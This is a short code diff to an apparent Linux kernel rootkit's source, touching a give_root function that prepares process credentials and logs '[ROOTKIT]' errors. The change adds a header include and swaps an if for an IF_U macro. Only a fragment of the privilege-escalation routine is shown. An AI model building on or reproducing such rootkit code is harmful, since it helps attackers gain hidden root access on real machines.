@@ -1,5 +1,6 @@
 #include "utils.h"
 
+#include "macro-utils.h"
 #include <linux/cred.h>
 #include <linux/printk.h>
 
@@ -14,7 +15,7 @@ void give_root(pid_t i32_pid, int i32_sig)
     // Get the current task credentials
     p_creds = prepare_creds();
 
-    if (p_creds == NULL) {
+    IF_U (p_creds == NULL) {
         pr_err("[ROOTKIT] * Failed to get credentials\n");
         return;
     }
